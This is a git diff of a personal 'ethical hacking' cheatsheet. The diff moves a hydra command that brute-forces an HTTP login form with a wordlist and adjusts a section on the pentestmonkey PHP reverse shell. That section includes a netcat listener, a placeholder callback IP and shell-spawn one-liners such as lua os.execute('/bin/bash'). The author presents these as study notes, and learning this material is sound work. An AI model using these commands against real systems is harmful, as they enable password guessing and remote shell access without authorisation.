@@ -1,5 +1,3 @@
-<body>
-
 # MyHackingCheatsheet
 while I am studing ethical hacking I will add usefull commands and scripts
 <h4>shell spawn</h4>
@@ -13,8 +11,11 @@ while I am studing ethical hacking I will add usefull commands and scripts
     <li>lua: os.execute('/bin/bash')</li>
 </ul>
 
+    
+<h4>hydra</h4>
+<p>hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V</p>
+
 <h4>php reverse shell  script </h4>
-<reverse>
 <p>nc -lvnp 1234</p>
 <pre><?php
     // php-reverse-shell - A Reverse Shell implementation in PHP
@@ -61,8 +62,7 @@ while I am studing ethical hacking I will add usefull commands and scripts
     // Usage
     // -----
     // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
-    </pre>
-    <pre>
+    
     set_time_limit (0);
     $VERSION = "1.0";
     <b>$ip = '127.0.0.1';  // CHANGE THIS
@@ -208,7 +208,3 @@ while I am studing ethical hacking I will add usefull commands and scripts
     
     ?> 
     </pre>
-    </reverse>
-    <h4>hydra</h4>
-    <p>hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V</p>
-</body>
